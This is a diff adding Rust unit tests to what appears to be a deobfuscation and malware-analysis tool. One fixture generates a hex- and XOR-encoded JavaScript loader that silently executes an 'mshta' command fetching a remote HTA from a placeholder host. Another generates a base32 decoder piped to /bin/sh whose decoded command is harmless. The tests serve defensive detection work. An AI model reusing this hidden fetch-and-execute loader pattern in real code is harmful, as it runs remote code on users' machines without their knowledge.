@@ -957,3 +957,107 @@ local raw = [[\065]]
             .any(|s| { s.section.as_deref() == Some("ast") && s.value.as_ref() == "A" })
     );
 }
+
+/// The hex/XOR fixture `unpack::js_xor_command` recovers: an `mshta` command
+/// line run through `child_process.exec`.
+const XOR_COMMAND: &str = "mshta https://program.fixturetests.net/control.hta";
+fn xor_loop_source(key: u8) -> String {
+    let blob = hex::encode(XOR_COMMAND.bytes().map(|b| b ^ key).collect::<Vec<_>>());
+    format!(
+        "const cp=require('child_process');\nconst BLOB='{blob}'; const KEY={key};\nfunction f(){{const raw=Buffer.from(BLOB,'hex');const plain=Buffer.alloc(raw.length);for(let i=0;i<raw.length;i++){{plain[i]=raw[i]^KEY;}}(0,cp.exec)(plain.toString('utf8'),{{windowsHide:true}},()=>{{}});}}"
+    )
+}
+
+#[test]
+fn js_xor_command_yields_a_batch_layer_with_source_facts() {
+    let source = xor_loop_source(57);
+    let analyzer = UnifiedSourceAnalyzer::for_file_type(&FileType::JavaScript)
+        .unwrap()
+        .with_engine(crate::Engine::empty());
+    let report = analyzer.analyze_source(std::path::Path::new("input.js"), &source);
+    let sha = crate::analyzers::utils::calculate_sha256(XOR_COMMAND.as_bytes());
+    let child = report
+        .files
+        .iter()
+        .find(|f| f.sha256 == sha)
+        .expect("decoded command");
+    assert_eq!(child.file_type, "batch");
+    assert_eq!(
+        child.encoding.as_deref(),
+        Some(["hex".into(), "xor".into()].as_slice())
+    );
+    let view = child.filefacts.as_ref().unwrap();
+    assert_eq!(
+        view.values.pointer("/source/batch/command_sites/0/text"),
+        Some(&XOR_COMMAND.into())
+    );
+}
+
+const PY_PAYLOAD: &str = "OBZGS3TUMYQCOJLTLRXCOIBHNBQXE3LMMVZXGIDEMVRW6ZDFOIQGG33OORZG63BAN5XGY6JH";
+const PY_COMMAND: &str = "printf '%s\\n' 'harmless decoder control only'";
+fn python_b32_fixture() -> String {
+    format!(
+        "import base64\nimport subprocess\nDATA = '{PY_PAYLOAD}'\ndef helper():\n    entry = base64.b32decode(DATA + '=' * (-len(DATA) % 8))\n    subprocess.run(['/bin/sh', '-c', entry.decode()], capture_output=True, timeout=15)\n"
+    )
+}
+
+#[test]
+fn python_encoded_command_yields_a_shell_layer_with_exact_hash() {
+    let source = python_b32_fixture();
+    let analyzer = UnifiedSourceAnalyzer::for_file_type(&FileType::Python)
+        .unwrap()
+        .with_engine(crate::Engine::empty());
+    let report = analyzer.analyze_source(std::path::Path::new("bound.py"), &source);
+    let expected = crate::analyzers::utils::calculate_sha256(PY_COMMAND.as_bytes());
+    let child = report
+        .files
+        .iter()
+        .find(|f| f.sha256 == expected)
+        .expect("decoded command layer");
+    assert_eq!(child.file_type, "shell");
+    assert_eq!(
+        child.encoding.as_deref(),
+        Some(["base32".to_owned()].as_slice())
+    );
+    assert!(child.path.contains(&format!(
+        "@{}",
+        source.find(&format!("'{PY_PAYLOAD}'")).unwrap()
+    )));
+}
+
+/// The encodings unpack's script reconstructors report are layer names
+/// cleave knows.
+#[test]
+fn script_reconstructor_chains_are_known_layer_names() {
+    for chain in [
+        vec!["scrypt", "aes-256-cbc", "base64"],
+        vec!["js-joined-base64-module"],
+        vec!["js-constant-string-table"],
+        vec!["hex", "xor"],
+        vec!["base32"],
+    ] {
+        let chain: Vec<String> = chain.into_iter().map(String::from).collect();
+        crate::analyzers::embedded_code_detector::generate_encoded_layer_traits(&chain, 0);
+    }
+}
+
+/// filefacts locates an Edge.js C# body (`source.embedded`); cleave analyzes
+/// it as a C# view beside the JavaScript host.
+#[test]
+fn edge_js_csharp_body_becomes_a_csharp_view() {
+    let csharp = "using System; using System.Threading.Tasks; class Startup { public async Task<object> Invoke(object input) { return input; } }";
+    let source = format!(
+        "const bridge=require('edge-js'); const compiled=bridge.func(function(){{/*{csharp}*/}});"
+    );
+    let analyzer = UnifiedSourceAnalyzer::for_file_type(&FileType::JavaScript)
+        .unwrap()
+        .with_engine(crate::Engine::empty());
+    let report = analyzer.analyze_source(std::path::Path::new("bridge.js"), &source);
+    let offset = source.find(csharp).unwrap();
+    let view = report
+        .files
+        .iter()
+        .find(|f| f.path.ends_with(&format!("##csharp@{offset}")))
+        .expect("C# view");
+    assert_eq!(view.file_type, "csharp");
+}
